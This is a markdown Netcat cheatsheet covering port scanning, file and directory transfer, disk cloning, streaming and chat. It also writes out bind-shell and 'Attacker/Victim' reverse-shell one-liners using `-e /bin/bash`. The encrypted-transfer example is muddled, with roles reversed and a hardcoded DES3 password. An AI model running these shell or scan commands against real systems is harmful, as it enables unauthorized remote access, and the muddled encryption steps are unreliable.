```
      ___           ___           ___           ___           ___           ___     
     /\__\         /\  \         /\  \         /\  \         /\  \         /\  \    
    /::|  |       /::\  \        \:\  \       /::\  \       /::\  \        \:\  \   
   /:|:|  |      /:/\:\  \        \:\  \     /:/\:\  \     /:/\:\  \        \:\  \  
  /:/|:|  |__   /::\~\:\  \       /::\  \   /:/  \:\  \   /::\~\:\  \       /::\  \ 
 /:/ |:| /\__\ /:/\:\ \:\__\     /:/\:\__\ /:/__/ \:\__\ /:/\:\ \:\__\     /:/\:\__\
 \/__|:|/:/  / \:\~\:\ \/__/    /:/  \/__/ \:\  \  \/__/ \/__\:\/:/  /    /:/  \/__/
     |:/:/  /   \:\ \:\__\     /:/  /       \:\  \            \::/  /    /:/  /     
     |::/  /     \:\ \/__/     \/__/         \:\  \           /:/  /     \/__/      
     /:/  /       \:\__\                      \:\__\         /:/  /                 
     \/__/         \/__/                       \/__/         \/__/                  
```

# Netcat (nc) Cheatsheet

Netcat (`nc`) is a versatile tool for TCP, UDP, and UNIX sockets. It can:
- Establish TCP connections
- Send/receive UDP packets
- Listen on arbitrary TCP/UDP ports
- Perform port scanning
- Handle IPv4 and IPv6

---

## Basic Syntax
```bash
nc [options] [host] [port]
```

---

## Port Scanning & Banner Grabbing
```bash
# Scan ports between 1 and 100
nc -zvn 192.168.59.1 1-100

# Scan ports 80, 22, and 443
nc -zvn 192.168.59.1 80 22 443

# Scan only port 80
nc -zvn 192.168.59.1 80

# Grab banner
nc sysxplore.com 80
```

---

## Downloading Files
```bash
# Sending side
nc -lvp 8888 < data.txt

# Receiving side
nc 192.168.59.3 8888 > data.txt
```

---

## Uploading Files
```bash
# Receiving side
nc -lvp 8888 > data.txt

# Sending side
nc 192.168.59.3 8888 < data.txt
```

---

## Compress & Transfer Directories
```bash
# Sender
tar cf - /backups | compress -c | nc 192.168.59.54 8888

# Receiver
nc -l -p 8888 | uncompress -c | tar xvf -
```

---

## Encrypt & Transfer
```bash
# Sender
nc -l -p 8888 | openssl enc -e -des3 -pass pass:password > creds.txt

# Receiver
openssl enc -d -des3 -pass pass:password | nc 192.168.59.3 8888
```
> **Note**: Netcat transfers are not encrypted by default.

---

## Clone Linux Disk Drive
```bash
# Sender
dd if=/dev/sdb | nc -l -p 8888

# Receiver
nc 192.168.59.3 8888 | dd of=/dev/sdb
```

---

## Remote Shell
```bash
# Server
nc -nlvp 8888 -e /bin/bash

# Client
nc -nv 192.168.59.3 8888
```

---

## Reverse Shell
```bash
# Attacker
nc -nlvp 8888

# Victim
nc 192.168.59.3 8888 -e /bin/bash
```

---

## Video Streaming
```bash
# Server
cat video.avi | nc -nlvp 8888

# Client
nc 192.168.59.3 8888 | mplayer -vo x11 -cache 3000 -
```

---

## Chat App
```bash
# Server
nc -lvp 8888

# Client
nc 192.168.59.3 8888
```

---

## Useful Options
| Option | Description |
|--------|-------------|
| `-4`   | Forces IPv4 addresses only |
| `-6`   | Forces IPv6 addresses only |
| `-l`   | Listen for incoming connections |
| `-v`   | Verbose output |
| `-n`   | Disable DNS resolution |
| `-p`   | Specify source port |
| `-w`   | Set timeout |
| `-u`   | Use UDP instead of TCP |
| `-k`   | Keep listening after disconnect |
| `-z`   | Port scan mode |
| `-h`   | Show help |
| `-x`   | Use proxy |

---

## Reference
**sysxplore.com**  
